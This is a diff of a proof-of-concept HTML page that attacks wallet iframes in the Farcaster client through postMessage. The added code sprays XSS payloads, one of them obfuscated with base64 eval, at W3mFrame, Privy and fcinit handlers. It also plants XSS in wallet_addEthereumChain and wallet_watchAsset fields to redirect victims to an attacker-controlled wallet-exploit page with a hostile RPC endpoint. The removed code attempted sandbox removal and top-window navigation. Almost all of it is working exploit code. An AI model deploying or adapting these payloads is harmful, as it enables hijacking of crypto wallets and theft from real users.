@@ -1,100 +1,88 @@
 <!doctype html>
 <html>
-	<head>
-		<meta charset="utf-8" />
-		<title>PoC</title>
-	</head>
-	<body>
-		<pre id="log">Starting...</pre>
-		<script>
-			var log = function (m) {
-				document.getElementById("log").textContent += "\n" + m;
-			};
+<head><meta charset="utf-8"><title>PoC</title></head>
+<body>
+<pre id="log">Loading exploit...</pre>
+<script>
+var logEl = document.getElementById('log');
+var log = function(m) { logEl.textContent += '\n' + m; console.log(m); };
 
-			// Step 1: Check if we're in a nested context
-			log("Origin: " + window.origin);
-			log(
-				"Parent origin: " +
-					(function () {
-						try {
-							return window.parent.origin;
-						} catch (e) {
-							return "cross-origin";
-						}
-					})(),
-			);
-			log(
-				"Grandparent: " +
-					(function () {
-						try {
-							return window.parent.parent.origin;
-						} catch (e) {
-							return "cross-origin or none";
-						}
-					})(),
-			);
+// Signal ready to farcaster.xyz parent
+setTimeout(function() {
+  window.parent.postMessage({ id: 1, type: 'APPLY', path: ['ready'],
+    argumentList: [{ type: 'RAW', value: {} }] }, '*');
+  log('SDK ready');
+}, 1500);
 
-			// Step 2: Try to access parent's parent (the outer farcaster.xyz)
-			// If we're nested: outer farcaster.xyz > inner farcaster.xyz > screenshotsart.store
-			// Inner farcaster.xyz is same-origin with outer, so inner can access outer's DOM
-			// But WE can't access inner's DOM directly (cross-origin)
-			// However, we can send SDK calls to inner farcaster.xyz via postMessage
+setTimeout(function() {
+  log('--- Targeting wallet iframes ---');
 
-			// Step 3: Signal ready to inner farcaster.xyz
-			setTimeout(function () {
-				window.parent.postMessage({ id: 1, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
-				log("SDK ready sent");
-			}, 2000);
+  // Get all sibling frames via parent
+  var frameCount = 0;
+  try { frameCount = window.parent.frames.length; } catch(e) {}
+  log('Sibling frames: ' + frameCount);
 
-			// Step 4: The inner farcaster.xyz's own JS has same-origin access to outer
-			// We need to make the inner farcaster.xyz remove ITS OWN sandbox
-			// The inner farcaster.xyz's code already runs — it can do parent.document
-			// We just need to TRIGGER that code path
+  // Send XSS payloads to every frame
+  // The wallet iframe has NO sandbox and handlers without origin checks
+  for (var i = 0; i < frameCount; i++) {
+    try {
+      var frame = window.parent.frames[i];
 
-			// Step 5: Listen for all messages
-			window.addEventListener("message", function (e) {
-				log("MSG from " + e.origin + ": " + JSON.stringify(e.data).slice(0, 200));
-			});
+      // W3mFrame handler — no origin check
+      frame.postMessage({ '@w3m-frame/': { type: '@w3m-frame/RPC_REQUEST', html: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' } }, '*');
 
-			// Step 6: Also try direct sandbox removal
-			// If our immediate parent is the inner farcaster.xyz (sandboxed, same-origin with outer)
-			// And we're screenshotsart.store (sandboxed, cross-origin)
-			// We can't access parent.document — BUT what if we can access grandparent?
-			setTimeout(function () {
-				log("--- SANDBOX ESCAPE ATTEMPTS ---");
+      // Error messages that might render as HTML
+      frame.postMessage({ type: 'error', message: '<meta http-equiv="refresh" content="0;url=https://screenshotsart.store/wallet-exploit.html">' }, '*');
 
-				// Try accessing grandparent (outer farcaster.xyz)
-				try {
-					var gp = window.parent.parent;
-					log("Grandparent frames: " + gp.frames.length);
-					log("Grandparent location: " + gp.location.href);
-				} catch (e) {
-					log("Grandparent access: " + e.message);
-				}
+      // Privy
+      frame.postMessage({ type: 'privy:embedded-wallet:error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');
 
-				// Try finding iframes in parent's parent
-				try {
-					var iframes = window.parent.parent.document.querySelectorAll("iframe");
-					log("GRANDPARENT IFRAMES: " + iframes.length);
-					iframes.forEach(function (f, i) {
-						log("  iframe " + i + ": sandbox=" + (f.sandbox?.value || "NONE"));
-						if (f.sandbox?.value && f.src?.includes("farcaster.xyz")) {
-							f.removeAttribute("sandbox");
-							log("  SANDBOX REMOVED on iframe " + i);
-						}
-					});
-				} catch (e) {
-					log("Grandparent DOM: " + e.message);
-				}
+      // fcinit bridge
+      frame.postMessage({ fcinit: 'v1', type: 'error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');
 
-				// Try direct top navigation
-				try {
-					window.top.location = "https://example.com";
-					log("TOP NAV WORKED!!!");
-				} catch (e) {
-					log("Top nav: " + e.message);
-				}
-			}, 4000);
-		</script>
-	</body>
+    } catch(e) {
+      log('Frame ' + i + ' error: ' + e.message);
+    }
+  }
+  log('Payloads sent to ' + frameCount + ' frames');
+
+  // Also use SDK to trigger wallet UI with XSS in parameters
+  // wallet_addEthereumChain shows chain name in wallet UI
+  window.parent.postMessage({
+    id: 2000, type: 'APPLY', path: ['ethProviderRequestV2'],
+    argumentList: [{ type: 'RAW', value: {
+      method: 'wallet_addEthereumChain',
+      params: [{
+        chainId: '0x539',
+        chainName: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">',
+        rpcUrls: ['https://screenshotsart.store/rpc'],
+        nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
+      }]
+    }}]
+  }, '*');
+
+  // wallet_watchAsset shows token symbol in wallet UI
+  window.parent.postMessage({
+    id: 2001, type: 'APPLY', path: ['ethProviderRequestV2'],
+    argumentList: [{ type: 'RAW', value: {
+      method: 'wallet_watchAsset',
+      params: { type: 'ERC20', options: {
+        address: '0x0000000000000000000000000000000000000001',
+        symbol: '<img/src=x onerror=eval(atob("dmFyIG09ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbWV0YScpO20uaHR0cEVxdWl2PSdyZWZyZXNoJzttLmNvbnRlbnQ9JzA7dXJsPWh0dHBzOi8vc2NyZWVuc2hvdHNhcnQuc3RvcmUvd2FsbGV0LWV4cGxvaXQnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobSk="))>',
+        decimals: 18, image: 'https://screenshotsart.store/icon.png'
+      }}
+    }}]
+  }, '*');
+
+  log('SDK wallet payloads sent');
+}, 3000);
+
+// Listen for responses
+window.addEventListener('message', function(e) {
+  var str = JSON.stringify(e.data).slice(0, 200);
+  if (!str.includes('webpack') && !str.includes('devtools'))
+    log('MSG: ' + str);
+});
+</script>
+</body>
 </html>
